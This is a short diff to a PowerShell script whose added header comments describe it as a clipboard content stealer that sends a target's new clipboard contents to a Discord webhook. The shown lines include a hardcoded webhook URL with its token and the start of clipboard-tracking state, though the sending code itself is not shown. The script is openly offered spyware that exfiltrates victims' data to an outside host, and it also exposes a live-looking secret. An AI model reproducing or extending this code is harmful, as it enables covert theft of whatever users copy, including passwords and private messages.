@@ -1,3 +1,6 @@
+#Clipboard content stealer
+#Sends new content of targets clipboard to discord webhook
+
 #Yes I know this url shouldn't be publicly displayed
 $webhookUrl  = 'https://discord.com/api/webhooks/1168730851631190066/poAU86kAE69lPvlRvhu6kWwsZZPWUwZcQ7uCfLcDD1OcCvdNrZ9kP_SLAmxwCOFragvF'
 $PreviousClipboard = ""
